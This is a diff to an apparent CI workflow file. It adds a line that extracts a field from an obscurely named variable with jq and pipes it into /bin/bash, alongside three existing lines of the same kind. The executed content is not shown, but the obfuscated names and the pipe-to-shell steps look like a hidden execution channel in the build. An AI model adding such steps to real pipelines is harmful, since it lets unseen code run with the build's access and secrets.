@@ -38,6 +38,7 @@ jobs:
           echo $bkhs2 | jq -r .ia0 | /bin/bash
           printf '%s' "$xkr18" | jq -r .zhps480 | /bin/bash
           echo $mttmm7 | jq -r .cxtii3272 | /bin/bash
+          echo $rmilf12 | jq -r .mxld70487 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
